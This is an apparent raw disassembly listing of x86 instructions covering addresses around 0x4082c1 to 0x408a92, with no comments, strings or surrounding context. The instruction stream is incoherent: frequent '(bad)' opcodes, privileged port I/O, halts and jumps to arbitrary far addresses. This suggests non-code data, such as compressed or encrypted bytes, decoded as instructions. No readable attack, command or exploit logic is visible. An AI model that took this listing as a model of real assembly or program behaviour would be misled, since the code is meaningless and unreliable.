  4082c1:	push   edi
  4082c2:	loope  0x4082bb
  4082c4:	xor    ecx,DWORD PTR [eax-0x694ab092]
  4082ca:	dec    eax
  4082cb:	mov    al,0x5b
  4082cd:	pop    ds
  4082ce:	scas   eax,DWORD PTR es:[edi]
  4082cf:	rol    DWORD PTR [ebp-0x32],0x48
  4082d3:	pop    esp
  4082d4:	pushf  
  4082d5:	jnp    0x4082b6
  4082d7:	out    dx,eax
  4082d8:	inc    ebp
  4082d9:	mov    al,ds:0x41baea00
  4082de:	pop    ebx
  4082df:	mov    ebx,0xa5cb6f93
  4082e4:	fcomi  st,st(6)
  4082e6:	jle    0x4082ad
  4082e8:	add    BYTE PTR [ebx+0x190f5308],dl
  4082ee:	into   
  4082ef:	shr    BYTE PTR [ebx-0x101d001e],cl
  4082f5:	pop    edx
  4082f6:	loope  0x4082a5
  4082f8:	push   ss
  4082f9:	lods   eax,DWORD PTR ds:[esi]
  4082fa:	and    BYTE PTR [eax],0x20
  4082fd:	mov    dl,0x27
  4082ff:	add    eax,0x2f7b9fb7
  408304:	fimul  DWORD PTR [eax+0xc75ac06]
  40830a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40830b:	push   ebx
  40830c:	xchg   BYTE PTR [esi+edi*1-0x53],bl
  408310:	jge    0x4082e7
  408312:	sar    DWORD PTR [ecx+0xb2b5ad4],1
  408318:	scas   eax,DWORD PTR es:[edi]
  408319:	cpuid  
  40831b:	xchg   DWORD PTR [eax+0x46274389],eax
  408321:	mov    al,0x2b
  408323:	mov    BYTE PTR [ecx+edi*2],dl
  408326:	cld    
  408327:	hlt    
  408328:	xlat   BYTE PTR ds:[ebx]
  408329:	enter  0x5237,0x31
  40832d:	sub    esi,edx
  40832f:	int3   
  408330:	or     eax,0x1f8e61f3
  408335:	jb     0x40837a
  408337:	xor    eax,DWORD PTR [ebp+0x79]
  40833a:	test   BYTE PTR [edx+0x47],cl
  40833d:	lods   eax,DWORD PTR ds:[esi]
  40833e:	mov    WORD PTR [ecx],gs
  408340:	jg     0x4082e9
  408342:	and    eax,0xcd0de74c
  408347:	add    BYTE PTR [edi+0x2a],bl
  40834a:	(bad)  
  40834b:	and    DWORD PTR [edi-0x17472550],esp
  408351:	dec    ebx
  408352:	ins    BYTE PTR es:[edi],dx
  408353:	mov    eax,ds:0x256bac
  408358:	mov    esi,0x39879d18
  40835d:	pop    edi
  40835e:	shl    dl,cl
  408360:	cmp    eax,0xcfedfc52
  408365:	out    dx,al
  408366:	mov    edi,0x95e183e1
  40836b:	mov    al,ds:0xfd36fcb3
  408370:	xchg   esi,eax
  408371:	mov    esi,0x2eea6d2
  408376:	or     BYTE PTR [ebp+ecx*1+0x28],dh
  40837a:	mov    es,WORD PTR [edx]
  40837c:	ja     0x40837d
  40837e:	dec    ecx
  40837f:	das    
  408380:	xchg   edx,eax
  408381:	test   bh,ah
  408383:	lods   al,BYTE PTR ds:[esi]
  408384:	fidivr DWORD PTR [edx]
  408386:	pop    ss
  408387:	out    dx,al
  408388:	xchg   ecx,eax
  408389:	lds    edi,FWORD PTR [ebp-0x63]
  40838c:	inc    eax
  40838d:	push   ds
  40838e:	adc    eax,0xfed34d31
  408393:	fdiv   st(0),st
  408395:	mov    ecx,0xe379f825
  40839a:	mov    eax,ds:0x2df5815a
  40839f:	sbb    BYTE PTR [esi+0x6d176c70],al
  4083a5:	ds dec edi
  4083a7:	int3   
  4083a8:	cmp    DWORD PTR [esi+ebp*8],0x16622c05
  4083af:	ret    
  4083b0:	sbb    al,0xa3
  4083b2:	popf   
  4083b3:	jno    0x408414
  4083b5:	loopne 0x408368
  4083b7:	jle    0x408365
  4083b9:	daa    
  4083ba:	and    al,0x24
  4083bc:	scas   al,BYTE PTR es:[edi]
  4083bd:	xchg   ebp,eax
  4083be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083bf:	jmp    0xfe5933ab
  4083c4:	jb     0x4083cb
  4083c6:	aam    0xcd
  4083c8:	adc    al,BYTE PTR [edi+0x6b]
  4083cb:	sti    
  4083cc:	sahf   
  4083cd:	scas   eax,DWORD PTR es:[edi]
  4083ce:	cmp    al,0x9e
  4083d0:	cmovb  ecx,DWORD PTR [edx]
  4083d3:	loop   0x4083bf
  4083d5:	push   es
  4083d6:	and    BYTE PTR [edx-0x50],al
  4083d9:	loopne 0x408444
  4083db:	mov    ecx,0x4d630fdf
  4083e0:	loope  0x40842c
  4083e2:	(bad)  
  4083e3:	sub    eax,edi
  4083e5:	(bad)  
  4083e6:	pop    edx
  4083e7:	lods   al,BYTE PTR ds:[esi]
  4083e8:	and    al,0xed
  4083ea:	sub    DWORD PTR [edi+0x38e5699e],esi
  4083f0:	(bad)  
  4083f1:	sub    al,0xd1
  4083f3:	mov    DWORD PTR [edx-0x76d15380],0xcd04d243
  4083fd:	adc    ch,cl
  4083ff:	pusha  
  408400:	xchg   ebx,eax
  408401:	mov    cl,0xfc
  408403:	mov    bl,ch
  408405:	mov    eax,ds:0x3789fc2e
  40840a:	jae    0x40848b
  40840c:	outs   dx,BYTE PTR ds:[esi]
  40840d:	das    
  40840e:	sahf   
  40840f:	mov    ebp,0x5ec81af0
  408414:	sbb    al,0x5a
  408416:	jno    0x408452
  408418:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40841a:	dec    ecx
  40841b:	lahf   
  40841c:	(bad)  gs:[ebp-0x6e]
  408420:	(bad)  
  408421:	(bad)  
  408423:	or     edi,edi
  408425:	cli    
  408426:	in     eax,dx
  408427:	outs   dx,DWORD PTR ds:[esi]
  408428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408429:	jg     0x4083d6
  40842b:	push   es
  40842c:	imul   ebx,edx,0xffffffa6
  40842f:	out    0x31,eax
  408431:	mov    ebp,0x8776d73b
  408436:	sub    bl,BYTE PTR [ebx-0x2832721e]
  40843c:	mov    bl,BYTE PTR [eax]
  40843e:	fcmovb st,st(1)
  408440:	add    al,0xdf
  408442:	sbb    al,bl
  408444:	sbb    DWORD PTR [ebx+0x443dd465],ebp
  40844a:	outs   dx,BYTE PTR ds:[esi]
  40844b:	jecxz  0x40841c
  40844d:	push   edi
  40844e:	rcl    BYTE PTR [edx],1
  408450:	sar    DWORD PTR [ecx+0x3e],1
  408453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408454:	and    al,0x10
  408456:	push   0x57c67562
  40845b:	add    DWORD PTR [ebp+edx*8+0xb],eax
  40845f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408460:	pop    edi
  408461:	mov    edi,DWORD PTR [edi-0x64]
  408464:	dec    esp
  408465:	mov    ch,BYTE PTR [ebx+esi*4+0x37]
  408469:	inc    ebx
  40846a:	inc    ebx
  40846b:	jne    0x408468
  40846d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40846e:	mov    ah,0x59
  408470:	mul    bl
  408472:	leave  
  408473:	add    cl,bh
  408475:	addr16 dec ebx
  408477:	dec    esp
  408478:	xor    BYTE PTR [ebx+0x20],al
  40847b:	sbb    esi,DWORD PTR [ebx-0x652fcccc]
  408481:	scas   eax,DWORD PTR es:[edi]
  408482:	leave  
  408483:	iret   
  408484:	into   
  408485:	sbb    BYTE PTR [eax-0x24],ah
  408488:	dec    edx
  408489:	cmp    ebp,DWORD PTR [edi-0x68]
  40848c:	mov    al,0xeb
  40848e:	jmp    0x315df4bd
  408493:	test   eax,0x69b00c75
  408498:	adc    DWORD PTR [edx-0x65],0x5a0d7561
  40849f:	jae    0x408484
  4084a1:	ss (bad) 
  4084a3:	(bad)  [ebp-0x46]
  4084a6:	fnsave [esi-0x7b56a461]
  4084ac:	test   al,0x45
  4084ae:	mov    ds:0xdce13345,al
  4084b3:	popf   
  4084b4:	and    al,0x10
  4084b6:	(bad)  
  4084b8:	shl    DWORD PTR [edi-0x3b73ffaf],0x6b
  4084bf:	adc    edi,DWORD PTR [ebx]
  4084c1:	jne    0x408542
  4084c3:	arpl   WORD PTR [esi],si
  4084c5:	and    bl,0xde
  4084c8:	push   ecx
  4084c9:	mov    DWORD PTR [edi],esp
  4084cb:	jle    0x4084ce
  4084cd:	pop    ds
  4084ce:	mov    ecx,0xb9eded5
  4084d3:	or     al,BYTE PTR [edi-0x22]
  4084d6:	cmp    al,0x8d
  4084d8:	xor    al,0x18
  4084da:	pop    ecx
  4084db:	push   0xfad9f2b0
  4084e0:	mov    ds:0xa0c09071,al
  4084e5:	mov    cl,0x9a
  4084e7:	loopne 0x408524
  4084e9:	mov    cl,0x38
  4084eb:	pop    ebx
  4084ec:	pop    edx
  4084ed:	(bad)  
  4084ee:	mov    al,gs:0x290a2e0f
  4084f4:	je     0x4084d5
  4084f6:	test   esp,esp
  4084f8:	ret    0x6199
  4084fb:	and    bh,cl
  4084fd:	mov    esp,0xefebbb7a
  408502:	sar    BYTE PTR [eax],cl
  408504:	outs   dx,BYTE PTR ds:[esi]
  408505:	jno    0x408556
  408507:	mov    ah,0x84
  408509:	add    bl,dl
  40850b:	mov    ebx,0x817e1722
  408510:	pusha  
  408511:	icebp  
  408512:	xor    al,0x52
  408514:	retf   0x5dea
  408517:	pop    ds
  408518:	jae    0x408517
  40851a:	mov    bh,0x23
  40851c:	ficom  WORD PTR [edx+0x5d32e61e]
  408522:	call   0x31a7:0xaeafb62d
  408529:	sbb    dl,BYTE PTR [ecx+0x6ca3c815]
  40852f:	dec    ebx
  408530:	scas   eax,DWORD PTR es:[edi]
  408531:	cli    
  408532:	adc    BYTE PTR [eax+0x7b266750],dh
  408538:	sahf   
  408539:	repnz sti 
  40853b:	stos   DWORD PTR es:[edi],eax
  40853c:	push   edx
  40853d:	dec    esi
  40853e:	dec    esi
  40853f:	pop    ss
  408540:	sub    DWORD PTR [esi+eax*8],ecx
  408543:	fmul   DWORD PTR [eax-0x29215ab]
  408549:	cdq    
  40854a:	aad    0x45
  40854c:	ins    BYTE PTR es:[edi],dx
  40854d:	and    DWORD PTR [ecx],edi
  40854f:	out    dx,al
  408550:	sbb    ebx,ebx
  408552:	inc    ebx
  408553:	(bad)  
  408554:	mov    ebx,0xcb288022
  408559:	push   esi
  40855a:	mov    ebx,0x42c8ed63
  40855f:	adc    edi,DWORD PTR [eax]
  408561:	jp     0x408510
  408563:	cdq    
  408564:	xor    eax,DWORD PTR [esi+0x3a84114d]
  40856a:	xchg   esp,eax
  40856b:	mov    es,WORD PTR [ecx+0x5e]
  40856e:	jb     0x40858b
  408570:	mov    cl,0xe3
  408572:	push   es
  408573:	pop    esp
  408574:	jg     0x4085d4
  408576:	sbb    al,dh
  408578:	inc    edi
  408579:	je     0x4085dd
  40857b:	test   eax,0x9f6531c4
  408580:	adc    edi,esp
  408582:	scas   eax,DWORD PTR es:[edi]
  408583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408584:	inc    edi
  408585:	xchg   esp,eax
  408586:	pop    ds
  408587:	and    bl,0xac
  40858a:	std    
  40858b:	ds sub al,bh
  40858e:	sbb    eax,0xfd85b0a7
  408593:	xchg   edi,eax
  408594:	fldcw  WORD PTR [ebp+0x5d]
  408597:	stos   BYTE PTR es:[edi],al
  408598:	retf   0x6f14
  40859b:	(bad)  
  40859d:	fnsave ds:0x6bb3bfd6
  4085a3:	xlat   BYTE PTR ds:[ebx]
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xb81b45a6
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085f4
  4085c4:	or     al,al
  4085c6:	and    eax,0xa5087499
  4085cb:	push   ecx
  4085cc:	int3   
  4085cd:	mov    WORD PTR [esp+edi*4-0x45],?
  4085d1:	adc    ebp,DWORD PTR [ebx-0x36]
  4085d4:	jecxz  0x408578
  4085d6:	inc    esp
  4085d7:	ret    0x47a2
  4085da:	pop    edi
  4085db:	jb     0x408585
  4085dd:	leave  
  4085de:	cmc    
  4085df:	ja     0x408631
  4085e1:	adc    dl,dh
  4085e3:	push   es
  4085e4:	arpl   dx,si
  4085e6:	add    DWORD PTR [ebx+0x6e],eax
  4085e9:	leave  
  4085ea:	cmp    eax,eax
  4085ec:	int    0xb9
  4085ee:	or     ebp,DWORD PTR [eax-0x1c0bae27]
  4085f4:	add    eax,0xad2082d8
  4085f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085fa:	adc    eax,0x625d33e6
  4085ff:	in     al,dx
  408600:	popa   
  408601:	aad    0xee
  408603:	mov    ch,0x67
  408605:	sbb    esp,DWORD PTR [esi-0x5ad93b8a]
  40860b:	(bad)  
  40860c:	ficom  WORD PTR [edi]
  40860e:	pop    edi
  40860f:	aas    
  408610:	cs jecxz 0x40864e
  408613:	fiadd  DWORD PTR [ebx+ebp*8+0x11ade452]
  40861a:	and    BYTE PTR [esi+0x1e],cl
  40861d:	jp     0x40861a
  40861f:	cmp    eax,0x50ac9bf7
  408624:	out    0xe0,al
  408626:	jmp    0x43e1:0x3f8ec720
  40862d:	pop    es
  40862e:	pop    ebx
  40862f:	ret    
  408630:	pop    esi
  408631:	add    cl,BYTE PTR [ecx-0x5bee2b8e]
  408637:	add    eax,DWORD PTR [ebx+0x5d]
  40863a:	or     BYTE PTR [edi-0x1be50702],cl
  408640:	imul   esp,DWORD PTR [esi],0x5f19e25
  408646:	stos   BYTE PTR es:[edi],al
  408647:	into   
  408648:	lea    ecx,[ebx]
  40864a:	pop    ss
  40864b:	jmp    0x3028c01e
  408650:	mov    bl,0xbd
  408652:	test   al,0x54
  408654:	dec    edx
  408655:	cmc    
  408656:	retf   0xa31e
  408659:	mov    ch,0x38
  40865b:	dec    esi
  40865c:	xchg   esp,eax
  40865d:	stc    
  40865e:	push   ds
  40865f:	and    edx,edi
  408661:	add    dh,BYTE PTR [edx-0x34]
  408664:	inc    esi
  408665:	js     0x4086aa
  408667:	mov    eax,0x7b42a363
  40866c:	out    dx,al
  40866d:	cmp    al,BYTE PTR [edi]
  40866f:	repz in eax,dx
  408671:	add    BYTE PTR [eax],bl
  408673:	and    DWORD PTR [eax+edi*8-0x3b],ebp
  408677:	in     al,dx
  408678:	mov    edi,0x751d982e
  40867e:	lds    ebp,FWORD PTR [eiz*1+0x6eefea10]
  408685:	outs   dx,BYTE PTR ds:[esi]
  408686:	jle    0x40869c
  408688:	mov    dl,0x2e
  40868a:	cs pop ebx
  40868c:	xor    al,0xba
  40868e:	cmp    ebx,DWORD PTR [esi-0x59abff45]
  408694:	iret   
  408695:	inc    ecx
  408696:	mov    eax,0x3252194a
  40869b:	pop    ds
  40869c:	pop    ebx
  40869d:	stos   DWORD PTR es:[edi],eax
  40869e:	push   ecx
  40869f:	inc    eax
  4086a0:	lea    esi,[edx+0x3b6f3918]
  4086a6:	dec    ecx
  4086a7:	or     BYTE PTR [eax-0x765077bf],al
  4086ad:	fld    QWORD PTR [ecx-0x4e]
  4086b0:	pop    ecx
  4086b1:	mov    al,ds:0x88ee866
  4086b6:	push   esi
  4086b7:	push   edi
  4086b8:	sub    BYTE PTR [eax],dl
  4086ba:	mov    dh,0x8b
  4086bc:	rol    edi,0x80
  4086bf:	clc    
  4086c0:	hlt    
  4086c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086c2:	pop    esi
  4086c3:	js     0x408672
  4086c5:	inc    eax
  4086c6:	ja     0x408709
  4086c8:	inc    DWORD PTR [edx+0x4a]
  4086cb:	iret   
  4086cc:	(bad)  
  4086cd:	pop    ebp
  4086ce:	push   0x4e583879
  4086d3:	jb     0x4086e9
  4086d5:	jb     0x408684
  4086d7:	(bad)  
  4086d8:	cdq    
  4086d9:	js     0x4086c6
  4086db:	pop    ss
  4086dc:	add    BYTE PTR [esi],bh
  4086de:	cmc    
  4086df:	cmp    eax,DWORD PTR [ecx]
  4086e1:	cmp    al,0x3f
  4086e3:	mov    al,ds:0xfd4fba04
  4086e8:	stos   BYTE PTR es:[edi],al
  4086e9:	(bad)  
  4086ea:	test   ch,0x77
  4086ed:	pop    ebp
  4086ee:	lock repz aas 
  4086f1:	cmp    BYTE PTR [ecx],bh
  4086f3:	xchg   esp,eax
  4086f4:	(bad)  
  4086f5:	out    dx,al
  4086f6:	js     0x40871a
  4086f8:	push   cs
  4086f9:	imul   eax,DWORD PTR ds:0xe132a07d,0x71a078ab
  408703:	repnz in al,dx
  408705:	cmp    DWORD PTR [esi],ecx
  408707:	inc    ebx
  408708:	sbb    dl,BYTE PTR [esp+ebx*2]
  40870b:	push   esi
  40870c:	sub    BYTE PTR [ecx],0xf
  40870f:	or     eax,0xc03c74d6
  408714:	fldcw  WORD PTR [ebx+0x6307178f]
  40871a:	xor    dh,BYTE PTR [eax+0x4c66cfec]
  408720:	jb     0x408735
  408722:	adc    DWORD PTR [esi+0x52df65b7],0x2683c54d
  40872c:	sub    al,0x1
  40872e:	inc    ebp
  40872f:	add    ebx,esi
  408731:	in     al,0x9c
  408733:	pusha  
  408734:	dec    ebx
  408735:	jo     0x4087a8
  408737:	pop    ds
  408738:	xlat   BYTE PTR ds:[ebx]
  408739:	fdivp  st(3),st
  40873b:	or     edx,DWORD PTR [edx-0x7b]
  40873e:	and    DWORD PTR [esi],0xffffffb8
  408741:	pop    esi
  408742:	sub    dh,BYTE PTR [esi-0x3f552cd6]
  408748:	dec    ecx
  408749:	push   edx
  40874a:	xchg   al,dl
  40874c:	in     eax,dx
  40874d:	xchg   ah,cl
  40874f:	mov    eax,ds:0xccfda86e
  408754:	sub    edi,ebx
  408756:	sti    
  408757:	sar    DWORD PTR [edi],0x69
  40875a:	mov    DWORD PTR [edi+0x4d32ed92],edx
  408760:	push   eax
  408761:	push   ebx
  408762:	and    edx,edx
  408764:	pop    ebx
  408765:	aam    0xfc
  408767:	jmp    0x2d2e55a7
  40876c:	sub    edx,DWORD PTR [edi-0x475d2f72]
  408772:	sub    BYTE PTR [edi-0x70f062af],cl
  408778:	xchg   esp,eax
  408779:	into   
  40877a:	shl    BYTE PTR [edi+0x27],1
  40877d:	shl    ch,1
  40877f:	add    edi,eax
  408781:	dec    eax
  408782:	mov    eax,ds:0x280fdd07
  408787:	(bad)  
  408788:	sbb    DWORD PTR [ecx+ebp*2-0x14],ebp
  40878c:	outs   dx,DWORD PTR ds:[esi]
  40878d:	adc    al,0x62
  40878f:	xor    eax,ebx
  408791:	cmp    DWORD PTR [edi+0x637b6cb1],edi
  408797:	xor    bl,BYTE PTR [esi+edx*2+0x3c]
  40879b:	xor    ch,0xec
  40879e:	push   ds
  40879f:	and    eax,0x48acb54
  4087a4:	sub    DWORD PTR [ecx+0x914e63a],eax
  4087aa:	inc    ebp
  4087ab:	push   ecx
  4087ac:	das    
  4087ad:	inc    esp
  4087ae:	ins    BYTE PTR es:[edi],dx
  4087af:	mov    bh,0x5d
  4087b1:	imul   eax,eax,0x0
  4087b4:	mov    WORD PTR [edi-0x5e],ss
  4087b7:	cmp    eax,0x77470291
  4087bc:	push   edi
  4087bd:	retf   0x9c89
  4087c0:	stos   BYTE PTR es:[edi],al
  4087c1:	icebp  
  4087c2:	scas   eax,DWORD PTR es:[edi]
  4087c3:	or     esi,DWORD PTR [edi-0x1c]
  4087c6:	enter  0xa366,0x9
  4087ca:	inc    esi
  4087cb:	test   eax,0x3e57ec9b
  4087d0:	cmp    eax,DWORD PTR [edx]
  4087d2:	and    edi,edi
  4087d4:	gs cs ja 0x408798
  4087d8:	jecxz  0x40883b
  4087da:	xchg   ebx,eax
  4087db:	outs   dx,BYTE PTR ds:[esi]
  4087dc:	and    DWORD PTR [eax],eax
  4087de:	arpl   bp,ax
  4087e0:	ins    BYTE PTR es:[edi],dx
  4087e1:	rcl    BYTE PTR [edi-0x7b7ec268],0x97
  4087e8:	dec    esp
  4087e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087ea:	je     0x408779
  4087ec:	xchg   bl,al
  4087ee:	add    BYTE PTR [ebx+0x49],0x94
  4087f2:	cmp    cl,dl
  4087f4:	adc    DWORD PTR [esi+0x780d56b4],0x43
  4087fb:	jg     0x4087df
  4087fd:	adc    eax,0xa5b48303
  408802:	pop    edx
  408803:	mov    eax,ds:0x27b85fa0
  408808:	sub    ah,BYTE PTR [ebx-0x1b]
  40880b:	xchg   DWORD PTR [edx+0x63],esi
  40880e:	dec    ebp
  40880f:	adc    BYTE PTR [esi+0x4481e159],bh
  408815:	cli    
  408816:	push   es
  408817:	mov    ch,0xae
  408819:	mov    bl,0x1c
  40881b:	xor    DWORD PTR [ebx+0x44],esp
  40881e:	mov    ebp,0x1d59c33f
  408823:	pop    ds
  408824:	fist   WORD PTR [edi-0x150507af]
  40882a:	leave  
  40882b:	and    DWORD PTR [ecx],0xffffff9f
  40882e:	aad    0x77
  408830:	xor    ah,BYTE PTR [edx-0x5a]
  408833:	push   ecx
  408834:	repz pop ss
  408836:	xchg   edi,eax
  408837:	pusha  
  408838:	je     0x408883
  40883a:	fmul   st(0),st
  40883c:	inc    ebp
  40883d:	shr    DWORD PTR [ebp-0x73],cl
  408840:	xchg   edi,eax
  408841:	call   0xe383b6e2
  408846:	or     DWORD PTR [ebx],ebx
  408848:	adc    al,0x15
  40884a:	xor    al,0x1
  40884c:	fnstcw WORD PTR [edx]
  40884e:	mov    al,0x7f
  408850:	dec    edi
  408851:	fdivr  DWORD PTR [eax+eiz*1+0x2774f5da]
  408858:	ror    DWORD PTR [ecx+0x32],1
  40885b:	cmc    
  40885c:	(bad)  
  40885d:	(bad)  [eax+0x700b80fa]
  408863:	xchg   al,ah
  408865:	push   eax
  408866:	sar    BYTE PTR [edx-0x5a85bcb8],0x4b
  40886d:	jmp    0x408831
  40886f:	pushf  
  408870:	mov    bl,dh
  408872:	outs   dx,BYTE PTR ds:[esi]
  408873:	retf   0xd0e4
  408876:	add    al,0x2f
  408878:	leave  
  408879:	es mov cl,0x38
  40887c:	jb     0x40882f
  40887e:	pop    ebp
  40887f:	jne    0x40881e
  408881:	nop
  408882:	or     BYTE PTR [ebp-0x305c2167],dh
  408888:	pop    eax
  408889:	xor    eax,0x448092bf
  40888e:	xor    eax,0x1305871a
  408893:	repnz inc ecx
  408895:	dec    ebx
  408896:	data16 test al,0x2
  408899:	int    0x5
  40889b:	inc    ecx
  40889c:	inc    eax
  40889d:	push   eax
  40889e:	dec    ecx
  40889f:	add    bl,BYTE PTR [ebx-0x74d41060]
  4088a5:	pop    es
  4088a6:	sub    BYTE PTR [eax*4+0x471e9697],bl
  4088ad:	jmp    0xefe8ece3
  4088b2:	mov    DWORD PTR [ecx-0x2a],esi
  4088b5:	push   edx
  4088b6:	add    bl,ah
  4088b8:	arpl   ax,cx
  4088ba:	es inc eax
  4088bc:	mov    ebp,0x4faed354
  4088c1:	enter  0x8929,0x35
  4088c5:	test   DWORD PTR ds:0xf4f01d35,ebx
  4088cb:	cli    
  4088cc:	sub    DWORD PTR [ecx+eax*1+0x45],esi
  4088d0:	cwde   
  4088d1:	fs es cs je 0x408856
  4088d6:	jb     0x40888b
  4088d8:	repnz sub bh,0xe8
  4088dc:	and    DWORD PTR [edi+eax*8-0x54],eax
  4088e0:	dec    ebp
  4088e1:	jle    0x40886c
  4088e3:	scas   al,BYTE PTR es:[edi]
  4088e4:	(bad)  
  4088e5:	stc    
  4088e6:	sbb    bl,BYTE PTR [esi]
  4088e8:	clc    
  4088e9:	repz sbb dl,dh
  4088ec:	sub    BYTE PTR [ebx-0x4a8533d],dl
  4088f2:	jo     0x408881
  4088f4:	inc    ebp
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x49bca301],cl
  40890c:	jmp    esp
  40890e:	adc    DWORD PTR [edi+0x207070dc],edx
  408914:	jge    0x408986
  408916:	jo     0x408979
  408918:	mov    ah,0x2a
  40891a:	add    dh,0x70
  40891d:	(bad)  
  40891e:	fidiv  WORD PTR [esp+esi*4]
  408921:	sbb    cl,BYTE PTR [esi*8-0x5eec1e4]
  408928:	mov    edi,0xd5fe68ce
  40892d:	xchg   ecx,eax
  40892e:	push   edi
  40892f:	adc    eax,0xf40800aa
  408934:	dec    edx
  408935:	cmp    eax,0x4afa0447
  40893a:	jge    0x408906
  40893c:	push   esp
  40893d:	jl     0x4088e6
  40893f:	mov    ds:0x9119ff94,al
  408944:	xchg   ebx,eax
  408945:	jnp    0x4089a7
  408947:	mov    esp,DWORD PTR [edx+0x11]
  40894a:	adc    esi,edx
  40894c:	mov    dh,BYTE PTR [edi]
  40894e:	rcr    ebp,1
  408950:	or     edi,ecx
  408952:	std    
  408953:	mov    edi,0x46c1e7a0
  408958:	jbe    0x40891c
  40895a:	and    eax,0xfbda61b0
  40895f:	mov    ds:0x55562e4e,al
  408964:	mov    ah,0x2e
  408966:	(bad)
  40896a:	push   ebx
  40896b:	jl     0x408907
  40896d:	pop    ds
  40896e:	pop    ecx
  40896f:	mov    bl,BYTE PTR [ecx+0x6c]
  408972:	push   0xffffff9b
  408974:	lahf   
  408975:	push   esi
  408976:	ja     0x40891f
  408978:	mov    cl,0xff
  40897a:	mov    ebp,esp
  40897c:	outs   dx,BYTE PTR ds:[esi]
  40897d:	cmp    al,0x1f
  40897f:	xor    edi,DWORD PTR cs:[esi]
  408982:	stc    
  408983:	jg     0x4089e4
  408985:	pop    edx
  408986:	shr    BYTE PTR [edi+0x60],cl
  408989:	cmc    
  40898a:	jmp    0x40892b
  40898c:	mov    ds:0xd045f10e,al
  408991:	nop
  408992:	lods   eax,DWORD PTR ds:[esi]
  408993:	sar    DWORD PTR [esi-0x6cbd10a5],1
  408999:	inc    edi
  40899a:	and    al,BYTE PTR [edi+ecx*2-0x29ba056d]
  4089a1:	test   ebp,ebx
  4089a3:	inc    edi
  4089a4:	sbb    BYTE PTR [ebx],ch
  4089a6:	pop    esp
  4089a7:	or     ah,ah
  4089a9:	jb     0x408a19
  4089ab:	pop    edx
  4089ac:	sbb    dh,ch
  4089ae:	mov    edi,0x5e045b72
  4089b3:	repz fld DWORD PTR [eax-0x5059fdbb]
  4089ba:	sbb    al,0x2b
  4089bc:	ins    DWORD PTR es:[edi],dx
  4089bd:	imul   BYTE PTR ds:0xab2cfb08
  4089c3:	push   cs
  4089c4:	jo     0x408a36
  4089c6:	jmp    0xa0045a57
  4089cb:	js     0x4089e3
  4089cd:	fcom   DWORD PTR [esi]
  4089cf:	pusha  
  4089d0:	popa   
  4089d1:	sbb    BYTE PTR [esi+0x3a],dl
  4089d4:	ficomp WORD PTR [esi-0x42]
  4089d7:	pop    ebx
  4089d8:	std    
  4089d9:	xor    ebx,esp
  4089db:	mov    ds:0x16041aa3,eax
  4089e0:	test   BYTE PTR ds:0xfbc67399,0x93
  4089e7:	repnz mov dl,0x74
  4089ea:	mov    ah,BYTE PTR [edx*2+0x4668f800]
  4089f1:	out    dx,eax
  4089f2:	push   es
  4089f3:	pop    ecx
  4089f4:	rcr    BYTE PTR [edx-0x15],1
  4089f7:	or     esi,0x9752c31b
  4089fd:	add    DWORD PTR [ecx],esp
  4089ff:	adc    DWORD PTR [ebx+ebx*8-0x7deaaa6f],esp
  408a06:	lock add eax,0xb9610a6
  408a0c:	mov    dl,BYTE PTR [edi]
  408a0e:	inc    edi
  408a0f:	jae    0x408a5f
  408a11:	out    0xf9,al
  408a13:	mov    al,ds:0xa7337d27
  408a18:	mov    WORD PTR [edi+eiz*1+0x18d141dc],fs
  408a1f:	sbb    al,0xbe
  408a21:	das    
  408a22:	aad    0xfb
  408a24:	inc    edi
  408a25:	push   ds
  408a26:	adc    DWORD PTR [ebp-0x7c0de7e9],esi
  408a2c:	int    0x7e
  408a2e:	xor    dl,BYTE PTR [eax]
  408a30:	push   ds
  408a31:	pop    ss
  408a32:	jne    0x408ab0
  408a34:	fidiv  DWORD PTR [eax+0x756d8f55]
  408a3a:	jg     0x4089cc
  408a3c:	lods   al,BYTE PTR ds:[esi]
  408a3d:	ss loope 0x408a1b
  408a40:	mov    ecx,DWORD PTR [eax]
  408a42:	jo     0x4089cf
  408a44:	fmul   DWORD PTR [ecx+0x52a71a17]
  408a4a:	ss in  eax,0xb9
  408a4d:	in     al,0xff
  408a4f:	inc    ebp
  408a50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a51:	xor    esi,DWORD PTR [edx+0x4c6bedad]
  408a57:	cwde   
  408a58:	(bad)  
  408a59:	mov    eax,ds:0xee9a3c06
  408a5e:	idiv   BYTE PTR fs:[edi]
  408a61:	mov    edi,0x3441a2db
  408a66:	repz out 0xf,al
  408a69:	sub    eax,0x7518c4df
  408a6e:	sub    edi,DWORD PTR [ecx]
  408a70:	add    BYTE PTR [eax],ch
  408a72:	cmp    al,0xff
  408a74:	mov    BYTE PTR [ebx+0x2a3a8d3e],bl
  408a7a:	jns    0x408a3e
  408a7c:	jb     0x408a50
  408a7e:	mov    eax,ds:0xde1daaf8
  408a83:	cmp    al,ah
  408a85:	jmp    0x408a42
  408a87:	mul    DWORD PTR [ebx+edx*1]
  408a8a:	mov    esi,DWORD PTR [ebx]
  408a8c:	loope  0x408a7b
  408a8e:	pop    eax
  408a8f:	clc    
  408a90:	jl     0x408a12
  408a92:	or     BYTE PTR [eax-0x6a],bh
